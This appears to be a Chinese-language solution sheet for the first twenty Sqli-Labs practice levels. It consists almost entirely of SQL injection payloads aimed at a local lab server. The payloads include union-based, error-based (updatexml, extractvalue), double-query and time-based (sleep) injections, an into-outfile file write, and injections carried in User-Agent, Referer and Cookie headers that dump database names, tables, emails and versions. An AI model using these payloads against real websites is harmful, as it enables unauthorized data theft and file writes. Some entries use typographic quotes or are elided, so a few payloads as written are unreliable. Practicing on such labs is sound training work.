##Sqli-Labs前20题解

	http://192.168.0.34/sql/Less-1/?id=' union select 1,2,database() %23
	http://192.168.0.34/sql/Less-1/?id=1' and 1=2 union select 1,2,database() %23
	
	http://192.168.0.34/sql/Less-2/?id='' union select 1,2,database() %23
	
	http://192.168.0.34/sql/Less-2/?id='' union select 1,2,group_concat(distinct+table_name)from information_schema.columns where table_schema='security'  %23
	
	http://192.168.0.34/sql/Less-2/?id='' union select 1,2,group_concat(distinct+column_name)from information_schema.columns where table_name='emails' %23
	
	http://192.168.0.34/sql/Less-2/?id='' union select 1,2,group_concat(distinct+id,0x2B,email_id)+from+emails %23
	
	http://192.168.0.34/sql/Less-3/?id=')  union select 1,2,database() %23 ('
	
	http://192.168.0.34/sql/Less-4/?id=1")  and 1=2 union select 1,2,database() %23 ("
	
	http://192.168.0.34/sql/Less-5/?id=9"' and 1=(updatexml(1,concat(0x3a,(select user())),1)) %23
	
	http://192.168.0.34/sql/Less-5/?id=1”' and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a) %23
	
	http://192.168.0.34/sql/Less-5/?id=9"' or 1=updatexml(1,concat(0x5e24,@@datadir,0x5e24),1) --+
	
	http://192.168.0.34/sql/Less-5/?id=9"' and 1=updatexml(1,concat(0x5e24,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5e24),1) --+
	
	http://192.168.0.34/sql/Less-5/?id=9"' and 1=updatexml(1,concat(0x5e24,(select group_concat(column_name) from information_schema.columns where table_schema=database()),0x5e24),1) --+
	
	http://192.168.0.34/sql/Less-5/?id=9"' and extractvalue(1, concat(0x5c,(select email_id from emails limit 1))) %23
	
	http://192.168.0.34/sql/Less-6/?id=1'" and 1=(updatexml(1,concat(0x3a,(select user())),1))  %23
	
	http://192.168.0.34/sql/Less-7/?id=1')) union all select NULL,NULL,0x74657374 into outfile 'c:\\a.txt'   %23 (('
	
	http://192.168.0.34/sql/Less-8/*******
	
	http://192.168.0.34/sql/Less-9/?id=1' and if((length(database()))>1,sleep(5),null)  %23
	
	http://192.168.0.34/sql/Less-10/?id=1" and sleep(5) %23
	
	http://192.168.0.34/sql/Less-11/
	uname=aaa' and 1=2 union select 1,database()  %23&passwd=bbbbb&submit=Submit
	
	http://192.168.0.34/sql/Less-12/
	uname=aaa") and 1=2 union select 1,database()  %23("&passwd=bbbbb&submit=Submit
	
	http://192.168.0.34/sql/Less-13/
	uname=aaa&passwd=bbbbb') and 1=(updatexml(1,concat(0x3a,(select user())),1)) %23('&submit=Submit
	
	http://192.168.0.34/sql/Less-14/
	uname=aaa&passwd=bbbbb" and 1=(updatexml(1,concat(0x3a,(select user())),1)) %23 &submit=Submit
	
	http://192.168.0.34/sql/Less-15/
	uname=aaaaaa' or sleep(2) %23&passwd=aaa&submit=Submit
	
	http://192.168.0.34/sql/Less-16/
	uname=aaaaaa") or sleep(2) %23&passwd=aaa&submit=Submit
	
	http://192.168.0.34/sql/Less-17/
	uname=admin&passwd=aaa' or sleep(2) %23&submit=Submit
	uname=admin&passwd=aaa' or 1=updatexml(1,concat(0x5e24,version(),0x5e24),1) --%20&submit=Submit
	
	http://192.168.0.34/sql/Less-18/
	uname=admin1&passwd=0&submit=Submit
	User-Agent: cc' or 1=updatexml(1,concat(0x5e24,version(),0x5e24),1),'','') -- )
	
	http://192.168.0.34/sql/Less-19/
	uname=admin1&passwd=0&submit=Submit
	Referer: 'or 1=extractvalue(1,concat(0x3c,version(),0x3c)),'') #
	
	http://192.168.0.34/sql/Less-20/  环境原因未成功
	Cookie:uname=admin‘ or 1=(select * from (select name_const(version(),1),name_const(version(),1))a group by a) --%20
	Cookie: uname=admind‘ union all select 1,(select group_concat(table_name) from information_schema.tables where table_schema=‘security‘),3 --%20